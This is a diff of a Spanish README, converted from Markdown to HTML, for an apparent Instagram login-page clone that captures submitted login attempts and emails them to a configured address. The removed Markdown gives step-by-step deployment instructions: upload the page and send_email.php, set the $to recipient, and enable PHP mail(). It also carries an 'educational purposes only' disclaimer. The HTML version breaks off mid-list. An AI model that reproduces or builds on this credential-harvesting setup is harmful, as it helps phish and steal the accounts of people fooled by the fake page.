@@ -1,33 +1,47 @@
-# Página de Inicio de Sesión de Instagram
-
-Este es un mockup simple de la página de inicio de sesión de Instagram, que incluye un formulario de inicio de sesión y un sistema básico de envío de correo electrónico para capturar intentos de inicio de sesión.
-
-## Estructura de Archivos
-
-- `index.html`: Contiene el código HTML para la página de inicio de sesión.
-- `send_email.php`: Script PHP para procesar y enviar correos electrónicos con los detalles del intento de inicio de sesión.
-
-## Uso
-
-1. Coloca los archivos `index.html` y `send_email.php` en tu servidor web.
-
-2. Asegúrate de que el formulario HTML en `index.html` apunte al archivo PHP (`send_email.php`) en la acción del formulario.
-
-3. Configura la dirección de correo electrónico del destinatario en la variable `$to` dentro del archivo PHP.
-
-4. Personaliza el cuerpo del correo electrónico y los campos capturados según tus necesidades.
-
-5. Asegúrate de que el servidor web tenga permisos para enviar correos electrónicos utilizando la función `mail()` de PHP.
-
-## Advertencia
-
-- Este es un ejemplo básico y no ofrece protección completa contra ataques de seguridad. Es importante implementar medidas adicionales según sea necesario para proteger tu aplicación.
-
-## Créditos
-
-- La imagen del logotipo de Instagram es propiedad de Instagram.
-- Este proyecto es solo con fines educativos y de demostración.
-
----
-
-¡Disfruta de tu página de inicio de sesión de Instagram!
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>README - Página de Inicio de Sesión de Instagram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 20px;
+            padding: 20px;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #666;
+        }
+        ul {
+            list-style-type: none;
+            padding: 0;
+        }
+        li {
+            margin-bottom: 10px;
+        }
+        a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <h1>Página de Inicio de Sesión de Instagram</h1>
+    <div>
+        <p>Este es un mockup simple de la página de inicio de sesión de Instagram, que incluye un formulario de inicio de sesión y un sistema básico de envío de correo electrónico para capturar intentos de inicio de sesión.</p>
+    </div>
+    <h2>Estructura de Archivos</h2>
+    <ul>
+        <li><code>index.html</code>: Contiene el código HTML para la página de inicio de sesión.</li>
+        <li><code>send_email.php</code>: Script PHP para procesar y enviar correos electrónicos con los detalles del intento de inicio de sesión.</li>
+    </ul>
+    <h2>Uso</h2>
+    <ol>
+        <li>Coloca los archivos <code>index.html</code> y <code>send_email.php</code> en tu servidor web.</l
